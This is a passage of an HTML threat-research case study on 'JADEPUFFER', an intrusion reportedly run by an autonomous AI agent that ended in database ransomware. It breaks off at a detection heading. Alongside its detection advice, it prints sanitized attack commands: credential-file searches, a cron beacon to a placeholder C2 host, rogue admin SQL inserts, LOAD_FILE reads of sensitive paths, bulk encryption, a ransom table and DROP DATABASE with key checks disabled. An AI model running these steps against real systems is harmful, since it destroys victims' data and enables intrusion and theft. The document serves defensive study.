@@ -1,1 +1,720 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="JADEPUFFER agentic AI ransomware technical analysis by Gopichand Murari.">
+  <meta property="og:title" content="JADEPUFFER — Agentic AI Ransomware Analysis">
+  <meta property="og:description" content="A step-by-step technical analysis covering commands, attack flow, MITRE ATT&CK mapping and detection opportunities.">
+  <meta property="og:type" content="article">
+  <title>JADEPUFFER — Agentic AI Ransomware Analysis | Gopichand Murari</title>
+  <style>
+    :root {
+      --bg:#07111f; --panel:#0d1b2a; --panel2:#11243a; --text:#e7eef7;
+      --muted:#9fb2c7; --accent:#42d3ff; --accent2:#7cf7c8;
+      --border:#203a55; --danger:#ff6b6b; --warn:#ffd166;
+    }
+    * { box-sizing:border-box; }
+    html { scroll-behavior:smooth; }
+    body { margin:0; font-family:Inter,Segoe UI,Arial,sans-serif; background:linear-gradient(180deg,#06101d,#0a1727 45%,#07111f); color:var(--text); line-height:1.72; }
+    .progress { position:fixed; top:0; left:0; height:3px; background:var(--accent); width:0; z-index:1000; }
+    .topbar { position:sticky; top:0; z-index:100; backdrop-filter:blur(12px); background:rgba(7,17,31,.87); border-bottom:1px solid var(--border); }
+    .topbar-inner { max-width:1180px; margin:auto; padding:14px 22px; display:flex; justify-content:space-between; align-items:center; gap:20px; }
+    .brand { font-weight:800; letter-spacing:.08em; }
+    .topbar a { color:var(--text); text-decoration:none; }
+    .back { color:var(--accent)!important; font-weight:700; }
+    .hero { max-width:1180px; margin:0 auto; padding:72px 22px 40px; }
+    .eyebrow { color:var(--accent2); text-transform:uppercase; letter-spacing:.16em; font-weight:800; font-size:.78rem; }
+    .hero h1 { font-size:clamp(2.4rem,6vw,5.2rem); line-height:1.03; margin:.4rem 0 1rem; }
+    .hero p { max-width:820px; color:var(--muted); font-size:1.14rem; }
+    .meta { display:flex; gap:12px; flex-wrap:wrap; margin-top:24px; }
+    .chip { border:1px solid var(--border); background:rgba(17,36,58,.75); padding:8px 12px; border-radius:999px; color:#d8e6f5; font-size:.9rem; }
+    .layout { max-width:1180px; margin:auto; padding:0 22px 80px; display:grid; grid-template-columns:250px minmax(0,1fr); gap:34px; }
+    aside { position:sticky; top:78px; align-self:start; max-height:calc(100vh - 100px); overflow:auto; padding:18px; background:rgba(13,27,42,.72); border:1px solid var(--border); border-radius:16px; }
+    aside strong { display:block; margin-bottom:10px; }
+    aside a { display:block; color:var(--muted); text-decoration:none; padding:5px 0; font-size:.9rem; }
+    aside a:hover { color:var(--accent); }
+    article { min-width:0; background:rgba(13,27,42,.58); border:1px solid var(--border); border-radius:20px; padding:clamp(22px,5vw,56px); box-shadow:0 20px 60px rgba(0,0,0,.25); }
+    h1,h2,h3,h4 { line-height:1.25; scroll-margin-top:90px; }
+    h2 { margin-top:2.6rem; padding-bottom:.55rem; border-bottom:1px solid var(--border); }
+    h3 { margin-top:2rem; color:#dff7ff; }
+    p,li { color:#c8d5e3; }
+    a { color:var(--accent); }
+    hr { border:0; border-top:1px solid var(--border); margin:2.5rem 0; }
+    code { font-family:Consolas,Monaco,monospace; background:#07111f; color:#9df7d2; padding:.14rem .38rem; border-radius:5px; }
+    pre { overflow:auto; padding:20px; border:1px solid #254766; border-radius:14px; background:#050c15; box-shadow:inset 0 0 0 1px rgba(255,255,255,.02); }
+    pre code { padding:0; background:none; color:#d7f9e8; }
+    blockquote { margin:1.4rem 0; border-left:4px solid var(--accent); background:rgba(66,211,255,.07); padding:14px 18px; border-radius:0 10px 10px 0; color:#dcecf8; }
+    .callout { margin:1.5rem 0; padding:16px 18px; border-radius:12px; border:1px solid var(--border); background:var(--panel2); }
+    .callout strong { display:block; margin-bottom:5px; text-transform:uppercase; letter-spacing:.08em; font-size:.8rem; }
+    .callout.warning,.callout.caution { border-left:4px solid var(--warn); }
+    .callout.important { border-left:4px solid var(--danger); }
+    .callout.note,.callout.tip { border-left:4px solid var(--accent2); }
+    .callout p { margin:0; }
+    .table-wrap { overflow:auto; margin:1.25rem 0; border:1px solid var(--border); border-radius:12px; }
+    table { border-collapse:collapse; width:100%; min-width:600px; }
+    th,td { padding:12px 14px; border-bottom:1px solid var(--border); text-align:left; vertical-align:top; }
+    th { background:#10243a; color:#f0f8ff; }
+    tr:last-child td { border-bottom:0; }
+    footer { text-align:center; color:var(--muted); padding:30px 20px 50px; }
+    @media (max-width:900px) {
+      .layout { grid-template-columns:1fr; }
+      aside { position:relative; top:auto; max-height:none; }
+    }
+  </style>
+</head>
+<body>
+<div class="progress" id="progress"></div>
+<nav class="topbar">
+  <div class="topbar-inner">
+    <a class="brand" href="/">◆ GOPICHAND MURARI</a>
+    <a class="back" href="/">← Back to Portfolio</a>
+  </div>
+</nav>
+
+<header class="hero">
+  <div class="eyebrow">Threat Research · Technical Case Study</div>
+  <h1>JADEPUFFER</h1>
+  <p>Agentic AI ransomware targeting database infrastructure — a step-by-step analysis of the attack chain, commands, adaptation, MITRE ATT&amp;CK mapping and defensive opportunities.</p>
+  <div class="meta">
+    <span class="chip">Agentic AI</span>
+    <span class="chip">Ransomware</span>
+    <span class="chip">Langflow</span>
+    <span class="chip">MySQL</span>
+    <span class="chip">MITRE ATT&amp;CK</span>
+  </div>
+</header>
+
+<div class="layout">
+  <aside>
+    <strong>On this page</strong>
+    <a href="#-executive-summary">Executive Summary</a>
+    <a href="#-why-this-case-matters">Why This Matters</a>
+    <a href="#-high-level-attack-flow">Attack Flow</a>
+    <a href="#-step-by-step-technical-analysis">Technical Analysis</a>
+    <a href="#-command-reference">Command Reference</a>
+    <a href="#-detection-opportunities">Detection Opportunities</a>
+    <a href="#-mitre-attck-mapping">MITRE ATT&amp;CK</a>
+    <a href="#-analyst-conclusion">Conclusion</a>
+  </aside>
+  <article>
+    <h1 id="jadepuffer">🛡️ JADEPUFFER</h1>
+<h2 id="agentic-ai-ransomware-targeting-database-infrastructure">Agentic AI Ransomware Targeting Database Infrastructure</h2>
+<p>!<a href="https://img.shields.io/badge/Threat-Ransomware-red" target="_blank" rel="noopener">Threat</a></p>
+<p>!<a href="https://img.shields.io/badge/Category-Agentic%20AI-purple" target="_blank" rel="noopener">Category</a></p>
+<p>!<a href="https://img.shields.io/badge/Platform-Linux-blue" target="_blank" rel="noopener">Platform</a></p>
+<p>!<a href="https://img.shields.io/badge/Database-MySQL-orange" target="_blank" rel="noopener">Database</a></p>
+<p>!<a href="https://img.shields.io/badge/Framework-MITRE%20ATT%26CK-yellow" target="_blank" rel="noopener">MITRE</a></p>
+<p>!<a href="https://img.shields.io/badge/Status-Analysis%20Complete-brightgreen" target="_blank" rel="noopener">Status</a></p>
+<div class="callout important"><strong>Important</strong><p>This article is an independent educational analysis based on publicly reported findings from the Sysdig Threat Research Team.   Commands are shown for defensive learning and are sanitized where appropriate. Do not use them against systems without explicit authorization.</p></div>
+<hr>
+<h2 id="case-information">📌 Case Information</h2>
+<div class='table-wrap'><table><thead><tr><th>Field</th><th>Details</th></tr></thead><tbody><tr><td><strong>Threat name</strong></td><td>JADEPUFFER</td></tr><tr><td><strong>Threat type</strong></td><td>Agentic AI-assisted ransomware and database extortion</td></tr><tr><td><strong>Initial target</strong></td><td>Internet-facing Langflow instance</td></tr><tr><td><strong>Downstream targets</strong></td><td>PostgreSQL, MinIO, MySQL and Alibaba Nacos</td></tr><tr><td><strong>Primary impact</strong></td><td>Credential theft, persistence, database encryption and destruction</td></tr><tr><td><strong>Analyst</strong></td><td>Gopi</td></tr><tr><td><strong>Primary source</strong></td><td>Sysdig Threat Research Team</td></tr><tr><td><strong>Status</strong></td><td>Case analysis complete</td></tr></tbody></table></div>
+<hr>
+<h2 id="table-of-contents">📑 Table of Contents</h2>
+<ol>
+<li>1. <a href="#-executive-summary" target="_blank" rel="noopener">Executive Summary</a></li>
+<li>2. <a href="#-why-this-case-matters" target="_blank" rel="noopener">Why This Case Matters</a></li>
+<li>3. <a href="#-high-level-attack-flow" target="_blank" rel="noopener">High-Level Attack Flow</a></li>
+<li>4. <a href="#-step-by-step-technical-analysis" target="_blank" rel="noopener">Step-by-Step Technical Analysis</a></li>
+<li>5. <a href="#-command-reference" target="_blank" rel="noopener">Command Reference</a></li>
+<li>6. <a href="#-what-made-jadepuffer-different" target="_blank" rel="noopener">What Made JADEPUFFER Different</a></li>
+<li>7. <a href="#-detection-opportunities" target="_blank" rel="noopener">Detection Opportunities</a></li>
+<li>8. <a href="#-mitre-attck-mapping" target="_blank" rel="noopener">MITRE ATT&amp;CK Mapping</a></li>
+<li>9. <a href="#-incident-response-priorities" target="_blank" rel="noopener">Incident Response Priorities</a></li>
+<li>10. <a href="#-lessons-learned" target="_blank" rel="noopener">Lessons Learned</a></li>
+<li>11. <a href="#-analyst-conclusion" target="_blank" rel="noopener">Analyst Conclusion</a></li>
+<li>12. <a href="#-reference" target="_blank" rel="noopener">Reference</a></li>
+</ol>
+<hr>
+<h1 id="executive-summary">🧾 Executive Summary</h1>
+<p>JADEPUFFER is notable not because every technique was new, but because an AI agent reportedly connected established attack techniques into a largely autonomous intrusion workflow.</p>
+<p>The operation began with the compromise of an internet-facing Langflow server. After gaining code execution, the agent performed host reconnaissance, searched for credentials, accessed supporting infrastructure, created persistence, pivoted toward production databases and ultimately encrypted or destroyed configuration data.</p>
+<p>The most important observation was the agent's ability to react to failure. When an expected JSON response arrived as XML, it adjusted its parser. When a newly created Nacos administrator account failed to authenticate, it corrected the password-hashing process and retried. When database deletion failed because of foreign-key constraints, it modified the SQL operation to bypass those constraints.</p>
+<div class="callout note"><strong>Note</strong><p>The individual commands were mostly familiar. The major change was the speed and autonomy with which they were selected, tested, corrected and chained together.</p></div>
+<hr>
+<h1 id="why-this-case-matters">🎯 Why This Case Matters</h1>
+<p>Traditional automated malware usually follows a predetermined sequence:</p>
+<pre><code class="language-text">Run command → Check result → Continue or stop</code></pre>
+<p>An agentic workflow can behave more like:</p>
+<pre><code class="language-text">Observe environment
+      ↓
+Choose an action
+      ↓
+Execute command
+      ↓
+Interpret the result
+      ↓
+Correct the approach
+      ↓
+Continue toward the objective</code></pre>
+<p>For defenders, this can reduce the time between initial compromise and destructive impact.</p>
+<hr>
+<h1 id="high-level-attack-flow">🗺️ High-Level Attack Flow</h1>
+<pre><code class="language-mermaid">flowchart LR
+    A[Internet-Facing Langflow] --&gt; B[Python Code Execution]
+    B --&gt; C[Host Reconnaissance]
+    C --&gt; D[Credential and Secret Discovery]
+    D --&gt; E[PostgreSQL Collection]
+    E --&gt; F[MinIO Discovery]
+    F --&gt; G[Cron Persistence]
+    G --&gt; H[MySQL Access]
+    H --&gt; I[Nacos Admin Creation]
+    I --&gt; J[Container Reconnaissance]
+    J --&gt; K[Database Encryption]
+    K --&gt; L[Ransom Table]
+    L --&gt; M[Database Destruction]</code></pre>
+<hr>
+<h1 id="step-by-step-technical-analysis">🔬 Step-by-Step Technical Analysis</h1>
+<h2 id="1-initial-access-langflow-exploitation">1️⃣ Initial Access — Langflow Exploitation</h2>
+<h3 id="what-happened">What happened</h3>
+<p>The intrusion began with an internet-facing Langflow server affected by <strong>CVE-2025-3248</strong>. The vulnerability reportedly enabled unauthenticated Python code execution.</p>
+<p>The payload was delivered as encoded Python through the vulnerable application endpoint.</p>
+<h3 id="simplified-flow">Simplified flow</h3>
+<pre><code class="language-text">Internet
+   ↓
+Exposed Langflow server
+   ↓
+Vulnerable endpoint
+   ↓
+Python execution
+   ↓
+Initial foothold</code></pre>
+<h3 id="defender-takeaway">Defender takeaway</h3>
+<p>Monitor AI orchestration platforms for:</p>
+<ul>
+<li>- Python execution initiated by the application service</li>
+<li>- Unexpected child processes</li>
+<li>- Encoded payloads</li>
+<li>- Outbound connections shortly after application requests</li>
+<li>- Newly created files in temporary directories</li>
+</ul>
+<div class="callout warning"><strong>Warning</strong><p>The exploit request itself is intentionally not reproduced in this article.</p></div>
+<hr>
+<h2 id="2-system-reconnaissance">2️⃣ System Reconnaissance</h2>
+<p>After gaining execution, the agent collected basic host and privilege information.</p>
+<h3 id="commands-observed">Commands observed</h3>
+<pre><code class="language-bash">id
+uname -a
+hostname</code></pre>
+<h3 id="explanation">Explanation</h3>
+<div class='table-wrap'><table><thead><tr><th>Command</th><th>Purpose</th><th>Security value to an attacker</th></tr></thead><tbody><tr><td><code>id</code></td><td>Displays the current user, UID, GID and group memberships</td><td>Determines current privileges</td></tr><tr><td><code>uname -a</code></td><td>Displays kernel, architecture and operating-system information</td><td>Helps identify the operating environment</td></tr><tr><td><code>hostname</code></td><td>Displays the system hostname</td><td>Helps identify the compromised asset</td></tr></tbody></table></div>
+<h3 id="example-interpretation">Example interpretation</h3>
+<pre><code class="language-text">id</code></pre>
+<p>An attacker uses the output to determine whether the process is running as:</p>
+<ul>
+<li>- <code>root</code></li>
+<li>- A service account</li>
+<li>- A container user</li>
+<li>- A restricted application user</li>
+</ul>
+<pre><code class="language-text">uname -a</code></pre>
+<p>The kernel and operating-system details can guide later actions, including selecting compatible commands or identifying whether the host is containerized.</p>
+<pre><code class="language-text">hostname</code></pre>
+<p>The hostname may reveal the host's role, such as:</p>
+<pre><code class="language-text">langflow-prod
+nacos-db
+mysql-primary</code></pre>
+<h3 id="detection-idea">Detection idea</h3>
+<p>Alert when an internet-facing application unexpectedly launches reconnaissance utilities or shell commands.</p>
+<hr>
+<h2 id="3-credential-and-secret-discovery">3️⃣ Credential and Secret Discovery</h2>
+<p>The agent searched for high-value files and configuration data.</p>
+<h3 id="targeted-artifacts">Targeted artifacts</h3>
+<pre><code class="language-text">.env
+credentials.json
+database configuration files
+cloud configuration files
+API keys
+LLM provider tokens</code></pre>
+<h3 id="why-these-files-matter">Why these files matter</h3>
+<p>A <code>.env</code> file can contain values such as:</p>
+<pre><code class="language-text">DB_USERNAME=[REDACTED]
+DB_PASSWORD=[REDACTED]
+AWS_ACCESS_KEY_ID=[REDACTED]
+OPENAI_API_KEY=[REDACTED]</code></pre>
+<p>A <code>credentials.json</code> file may contain:</p>
+<pre><code class="language-json">{
+  &quot;access_key&quot;: &quot;[REDACTED]&quot;,
+  &quot;secret_key&quot;: &quot;[REDACTED]&quot;
+}</code></pre>
+<h3 id="common-discovery-patterns">Common discovery patterns</h3>
+<p>The exact search commands were not the central focus of the report, but defenders should watch for processes recursively searching for sensitive filenames.</p>
+<p>Sanitized examples of suspicious search behavior include:</p>
+<pre><code class="language-bash">find / -name &quot;.env&quot; 2&gt;/dev/null
+find / -name &quot;credentials.json&quot; 2&gt;/dev/null</code></pre>
+<h3 id="command-explanation">Command explanation</h3>
+<div class='table-wrap'><table><thead><tr><th>Element</th><th>Meaning</th></tr></thead><tbody><tr><td><code>find /</code></td><td>Search from the root filesystem</td></tr><tr><td><code>-name ".env"</code></td><td>Match files named <code>.env</code></td></tr><tr><td><code>2&gt;/dev/null</code></td><td>Hide permission-denied errors</td></tr></tbody></table></div>
+<div class="callout caution"><strong>Caution</strong><p>These commands are common in administration and troubleshooting. Context is critical: the parent process, user, host role and timing determine whether the activity is suspicious.</p></div>
+<hr>
+<h2 id="4-langflow-postgresql-collection">4️⃣ Langflow PostgreSQL Collection</h2>
+<p>The agent accessed Langflow's backing PostgreSQL database and searched for valuable records.</p>
+<h3 id="data-of-interest">Data of interest</h3>
+<ul>
+<li>- Stored credentials</li>
+<li>- API keys</li>
+<li>- User records</li>
+<li>- Application configuration</li>
+<li>- Integration details</li>
+</ul>
+<h3 id="observed-behavior">Observed behavior</h3>
+<pre><code class="language-text">Connect to supporting database
+        ↓
+Collect selected records
+        ↓
+Write temporary staging files
+        ↓
+Review collected data
+        ↓
+Delete staging artifacts</code></pre>
+<h3 id="why-it-matters">Why it matters</h3>
+<p>This behavior suggests deliberate collection rather than random dumping. The agent appeared to assess which information could support further access.</p>
+<h3 id="detection-idea">Detection idea</h3>
+<p>Monitor for:</p>
+<ul>
+<li>- Application accounts querying credential-related tables</li>
+<li>- Large or unusual result sets</li>
+<li>- Database clients launched from unexpected processes</li>
+<li>- Temporary files created and quickly deleted after database access</li>
+</ul>
+<hr>
+<h2 id="5-minio-object-storage-discovery">5️⃣ MinIO Object Storage Discovery</h2>
+<p>The agent tested internal MinIO endpoints.</p>
+<h3 id="endpoints-referenced">Endpoints referenced</h3>
+<pre><code class="language-text">minio.internal:9000
+127.0.0.1:9000</code></pre>
+<h3 id="what-the-agent-looked-for">What the agent looked for</h3>
+<p>Buckets or objects related to:</p>
+<pre><code class="language-text">terraform-state
+backups
+internal configuration
+application data
+.env
+credentials.json</code></pre>
+<h3 id="adaptive-behavior">Adaptive behavior</h3>
+<p>The agent expected a JSON response but received XML. Instead of stopping, it changed its parsing logic and retried.</p>
+<pre><code class="language-text">Expected JSON
+     ↓
+Received XML
+     ↓
+Parser failed
+     ↓
+Agent modified parser
+     ↓
+Request retried successfully</code></pre>
+<div class="callout important"><strong>Important</strong><p>This is one of the clearest examples of agentic behavior in the case: the workflow changed based on the returned data format.</p></div>
+<h3 id="detection-idea">Detection idea</h3>
+<p>Investigate unexpected access to MinIO from:</p>
+<ul>
+<li>- AI application servers</li>
+<li>- Web application service accounts</li>
+<li>- Containers that do not normally use object storage</li>
+<li>- Hosts enumerating multiple buckets in a short period</li>
+</ul>
+<hr>
+<h2 id="6-persistence-through-cron">6️⃣ Persistence Through Cron</h2>
+<p>The agent created a scheduled task that periodically contacted attacker-controlled infrastructure.</p>
+<h3 id="sanitized-cron-pattern">Sanitized cron pattern</h3>
+<pre><code class="language-bash">*/30 * * * * python3 -c &quot;contact(&#x27;[C2-SERVER]/beacon&#x27;)&quot;</code></pre>
+<h3 id="how-the-schedule-works">How the schedule works</h3>
+<pre><code class="language-text">*/30 * * * *</code></pre>
+<div class='table-wrap'><table><thead><tr><th>Field</th><th>Value</th><th>Meaning</th></tr></thead><tbody><tr><td>Minute</td><td><code>*/30</code></td><td>Every 30 minutes</td></tr><tr><td>Hour</td><td><code>*</code></td><td>Every hour</td></tr><tr><td>Day of month</td><td><code>*</code></td><td>Every day</td></tr><tr><td>Month</td><td><code>*</code></td><td>Every month</td></tr><tr><td>Day of week</td><td><code>*</code></td><td>Every day of the week</td></tr></tbody></table></div>
+<h3 id="full-meaning">Full meaning</h3>
+<pre><code class="language-text">Execute the Python beacon every 30 minutes.</code></pre>
+<h3 id="why-attackers-use-cron">Why attackers use cron</h3>
+<ul>
+<li>- Survives the original shell session</li>
+<li>- Provides recurring access attempts</li>
+<li>- Blends with legitimate scheduled administration</li>
+<li>- Can execute scripts without an interactive login</li>
+</ul>
+<h3 id="detection-idea">Detection idea</h3>
+<p>Alert on:</p>
+<ul>
+<li>- New or modified crontab entries</li>
+<li>- Python, Bash or curl launched from cron</li>
+<li>- Scheduled commands containing external URLs or IP addresses</li>
+<li>- Cron activity created by application-service accounts</li>
+</ul>
+<hr>
+<h2 id="7-lateral-movement-toward-production">7️⃣ Lateral Movement Toward Production</h2>
+<p>The compromised Langflow server was used as a stepping stone toward a separate production environment.</p>
+<h3 id="targeted-services">Targeted services</h3>
+<pre><code class="language-text">MySQL
+Alibaba Nacos
+Production configuration data</code></pre>
+<p>The agent authenticated to MySQL with root-level database credentials.</p>
+<h3 id="security-significance">Security significance</h3>
+<p>A development or AI application server should not usually have unrestricted access to a production database. This stage highlights the risk of:</p>
+<ul>
+<li>- Flat networks</li>
+<li>- Overprivileged service accounts</li>
+<li>- Reused credentials</li>
+<li>- Secrets stored in application environments</li>
+<li>- Missing database source restrictions</li>
+</ul>
+<h3 id="detection-idea">Detection idea</h3>
+<p>Alert when production databases receive administrative connections from:</p>
+<ul>
+<li>- Web servers</li>
+<li>- AI orchestration servers</li>
+<li>- Development hosts</li>
+<li>- Previously unseen source IP addresses</li>
+</ul>
+<hr>
+<h2 id="8-nacos-administrator-account-creation">8️⃣ Nacos Administrator Account Creation</h2>
+<p>The agent inserted a new administrator directly into the Nacos backing database.</p>
+<h3 id="sanitized-sql-pattern">Sanitized SQL pattern</h3>
+<pre><code class="language-sql">INSERT INTO users
+(username, password, enabled)
+VALUES (&#x27;[NEW-ADMIN]&#x27;, &#x27;[PASSWORD-HASH]&#x27;, 1);
+
+INSERT INTO roles
+(username, role)
+VALUES (&#x27;[NEW-ADMIN]&#x27;, &#x27;ROLE_ADMIN&#x27;);</code></pre>
+<h3 id="step-by-step-explanation">Step-by-step explanation</h3>
+<h4 id="first-statement">First statement</h4>
+<pre><code class="language-sql">INSERT INTO users
+(username, password, enabled)
+VALUES (&#x27;[NEW-ADMIN]&#x27;, &#x27;[PASSWORD-HASH]&#x27;, 1);</code></pre>
+<div class='table-wrap'><table><thead><tr><th>SQL element</th><th>Purpose</th></tr></thead><tbody><tr><td><code>INSERT INTO users</code></td><td>Adds a new record to the user table</td></tr><tr><td><code>username</code></td><td>Defines the new account name</td></tr><tr><td><code>password</code></td><td>Stores a password hash</td></tr><tr><td><code>enabled = 1</code></td><td>Activates the account</td></tr></tbody></table></div>
+<h4 id="second-statement">Second statement</h4>
+<pre><code class="language-sql">INSERT INTO roles
+(username, role)
+VALUES (&#x27;[NEW-ADMIN]&#x27;, &#x27;ROLE_ADMIN&#x27;);</code></pre>
+<p>This assigns the new account administrative privileges.</p>
+<h3 id="failure-and-correction">Failure and correction</h3>
+<p>The first login failed. The agent then removed the malformed entries:</p>
+<pre><code class="language-sql">DELETE FROM roles
+WHERE username=&#x27;[NEW-ADMIN]&#x27;;
+
+DELETE FROM users
+WHERE username=&#x27;[NEW-ADMIN]&#x27;;</code></pre>
+<p>It reportedly regenerated a valid password hash, recreated the account and successfully logged in.</p>
+<h3 id="why-this-matters">Why this matters</h3>
+<p>The reported correction cycle occurred in approximately <strong>31 seconds</strong>.</p>
+<pre><code class="language-text">Account created
+     ↓
+Login failed
+     ↓
+Failure analyzed
+     ↓
+Password format corrected
+     ↓
+Account recreated
+     ↓
+Login succeeded</code></pre>
+<h3 id="detection-idea">Detection idea</h3>
+<p>Monitor for:</p>
+<ul>
+<li>- Direct SQL writes to authentication tables</li>
+<li>- New administrative accounts outside approved workflows</li>
+<li>- Rapid create-delete-create activity involving the same username</li>
+<li>- Database changes followed by successful administrative login</li>
+</ul>
+<hr>
+<h2 id="9-container-and-host-reconnaissance-through-mysql">9️⃣ Container and Host Reconnaissance Through MySQL</h2>
+<p>The agent tested whether MySQL could read sensitive host or container files.</p>
+<h3 id="commands-observed">Commands observed</h3>
+<pre><code class="language-sql">SELECT LOAD_FILE(&#x27;/var/run/docker.sock&#x27;);
+
+SELECT LOAD_FILE(&#x27;/proc/1/cgroup&#x27;);
+
+SELECT LOAD_FILE(&#x27;/etc/hostname&#x27;);</code></pre>
+<h3 id="explanation">Explanation</h3>
+<div class='table-wrap'><table><thead><tr><th>File</th><th>Why it is valuable</th></tr></thead><tbody><tr><td><code>/var/run/docker.sock</code></td><td>May provide access to the Docker daemon if exposed and accessible</td></tr><tr><td><code>/proc/1/cgroup</code></td><td>Can reveal whether the process is running inside a container</td></tr><tr><td><code>/etc/hostname</code></td><td>Reveals the current host or container name</td></tr></tbody></table></div>
+<h3 id="understanding-load-file">Understanding <code>LOAD_FILE()</code></h3>
+<pre><code class="language-sql">SELECT LOAD_FILE(&#x27;/etc/hostname&#x27;);</code></pre>
+<p><code>LOAD_FILE()</code> asks MySQL to read a file from the underlying filesystem. It only works when permissions and MySQL configuration allow it.</p>
+<h3 id="file-write-capability-test">File-write capability test</h3>
+<pre><code class="language-sql">SELECT &#x27;test&#x27;
+INTO OUTFILE &#x27;/var/lib/mysql-files/[TEST-FILE]&#x27;;</code></pre>
+<h3 id="explanation">Explanation</h3>
+<div class='table-wrap'><table><thead><tr><th>SQL element</th><th>Purpose</th></tr></thead><tbody><tr><td><code>SELECT 'test'</code></td><td>Creates test content</td></tr><tr><td><code>INTO OUTFILE</code></td><td>Writes the selected data to a file</td></tr><tr><td><code>/var/lib/mysql-files/</code></td><td>Common directory permitted by MySQL's secure-file configuration</td></tr></tbody></table></div>
+<h3 id="why-this-matters">Why this matters</h3>
+<p>Successful file reads or writes can indicate that the database service has access beyond what is operationally necessary.</p>
+<h3 id="detection-idea">Detection idea</h3>
+<p>Alert on:</p>
+<ul>
+<li>- <code>LOAD_FILE()</code> referencing <code>/proc</code>, <code>/etc</code>, Docker or Kubernetes paths</li>
+<li>- <code>INTO OUTFILE</code> usage by non-administrative accounts</li>
+<li>- Database queries attempting filesystem discovery</li>
+<li>- Temporary test files created by MySQL</li>
+</ul>
+<hr>
+<h2 id="database-encryption">🔟 Database Encryption</h2>
+<p>The agent generated a random encryption key and used MySQL's native encryption function.</p>
+<h3 id="sanitized-sql-pattern">Sanitized SQL pattern</h3>
+<pre><code class="language-sql">CREATE TABLE config_info_enc AS
+SELECT
+    data_id,
+    group_id,
+    tenant_id,
+    TO_BASE64(
+        AES_ENCRYPT(content, &#x27;[RANDOM-KEY]&#x27;)
+    ) AS enc_content
+FROM config_info;</code></pre>
+<h3 id="step-by-step-explanation">Step-by-step explanation</h3>
+<h4 id="create-a-replacement-table">Create a replacement table</h4>
+<pre><code class="language-sql">CREATE TABLE config_info_enc AS</code></pre>
+<p>Creates a new table from the results of the following query.</p>
+<h4 id="select-identifiers">Select identifiers</h4>
+<pre><code class="language-sql">SELECT
+    data_id,
+    group_id,
+    tenant_id,</code></pre>
+<p>Preserves selected identifiers from each configuration record.</p>
+<h4 id="encrypt-the-original-content">Encrypt the original content</h4>
+<pre><code class="language-sql">AES_ENCRYPT(content, &#x27;[RANDOM-KEY]&#x27;)</code></pre>
+<p>Encrypts the <code>content</code> field using the supplied key.</p>
+<h4 id="encode-the-encrypted-output">Encode the encrypted output</h4>
+<pre><code class="language-sql">TO_BASE64(...)</code></pre>
+<p>Converts binary encrypted data into text that can be stored and displayed more easily.</p>
+<h4 id="read-from-the-original-table">Read from the original table</h4>
+<pre><code class="language-sql">FROM config_info;</code></pre>
+<p>Processes every row in the original configuration table.</p>
+<h3 id="destructive-follow-up">Destructive follow-up</h3>
+<pre><code class="language-sql">DROP TABLE config_info;
+DROP TABLE his_config_info;</code></pre>
+<h3 id="explanation">Explanation</h3>
+<div class='table-wrap'><table><thead><tr><th>Command</th><th>Effect</th></tr></thead><tbody><tr><td><code>DROP TABLE config_info</code></td><td>Deletes the original active configuration table</td></tr><tr><td><code>DROP TABLE his_config_info</code></td><td>Deletes the configuration history table</td></tr></tbody></table></div>
+<h3 id="reported-impact">Reported impact</h3>
+<ul>
+<li>- <strong>1,342 configuration items affected</strong></li>
+<li>- Original tables removed</li>
+<li>- Encryption key reportedly displayed once but not stored or transmitted</li>
+</ul>
+<div class="callout warning"><strong>Warning</strong><p>If the only decryption key is not retained, paying a ransom may not result in data recovery.</p></div>
+<h3 id="detection-idea">Detection idea</h3>
+<p>Monitor for:</p>
+<ul>
+<li>- Bulk <code>AES_ENCRYPT()</code> use</li>
+<li>- New tables containing Base64-encoded encrypted content</li>
+<li>- <code>CREATE TABLE ... AS SELECT</code> against production configuration tables</li>
+<li>- <code>DROP TABLE</code> immediately following encryption activity</li>
+</ul>
+<hr>
+<h2 id="11-ransom-note-stored-inside-the-database">1️⃣1️⃣ Ransom Note Stored Inside the Database</h2>
+<p>Instead of creating a text file, the agent created a database table containing ransom instructions.</p>
+<h3 id="sanitized-table-structure">Sanitized table structure</h3>
+<pre><code class="language-sql">CREATE TABLE README_RANSOM (
+    id INT PRIMARY KEY,
+    message TEXT,
+    bitcoin VARCHAR(64),
+    contact VARCHAR(128)
+);</code></pre>
+<h3 id="explanation">Explanation</h3>
+<div class='table-wrap'><table><thead><tr><th>Column</th><th>Purpose</th></tr></thead><tbody><tr><td><code>id</code></td><td>Unique record identifier</td></tr><tr><td><code>message</code></td><td>Ransom demand</td></tr><tr><td><code>bitcoin</code></td><td>Payment address</td></tr><tr><td><code>contact</code></td><td>Attacker contact information</td></tr></tbody></table></div>
+<h3 id="why-this-technique-is-effective">Why this technique is effective</h3>
+<p>A database administrator investigating missing tables is likely to discover the ransom table immediately.</p>
+<h3 id="detection-idea">Detection idea</h3>
+<p>Alert on newly created tables containing terms such as:</p>
+<pre><code class="language-text">RANSOM
+README
+RECOVERY
+DECRYPT
+PAYMENT
+BITCOIN</code></pre>
+<hr>
+<h2 id="12-escalated-database-destruction">1️⃣2️⃣ Escalated Database Destruction</h2>
+<p>The agent attempted to remove entire databases.</p>
+<h3 id="initial-destructive-operation">Initial destructive operation</h3>
+<pre><code class="language-sql">DROP DATABASE [TARGET-DATABASE];</code></pre>
+<h3 id="failure-condition">Failure condition</h3>
+<p>The operation reportedly encountered foreign-key relationship issues.</p>
+<h3 id="adaptive-correction">Adaptive correction</h3>
+<pre><code class="language-sql">SET GLOBAL FOREIGN_KEY_CHECKS=0;
+
+DROP DATABASE [TARGET-DATABASE];
+
+SET GLOBAL FOREIGN_KEY_CHECKS=1;</code></pre>
+<h3 id="step-by-step-explanation">Step-by-step explanation</h3>
+<h4 id="disable-foreign-key-enforcement">Disable foreign-key enforcement</h4>
+<pre><code class="language-sql">SET GLOBAL FOREIGN_KEY_CHECKS=0;</code></pre>
+<p>Temporarily disables relationship checks that can block destructive operations.</p>
+<h4 id="delete-the-database">Delete the database</h4>
+<pre><code class="language-sql">DROP DATABASE [TARGET-DATABASE];</code></pre>
+<p>Removes the selected database and its objects.</p>
+<h4 id="restore-normal-checking">Restore normal checking</h4>
+<pre><code class="language-sql">SET GLOBAL FOREIGN_KEY_CHECKS=1;</code></pre>
+<p>Re-enables foreign-key validation.</p>
+<h3 id="why-this-matters">Why this matters</h3>
+<p>This was not simply a blind retry. The agent reportedly interpreted the specific SQL failure and selected a targeted correction.</p>
+<h3 id="detection-idea">Detection idea</h3>
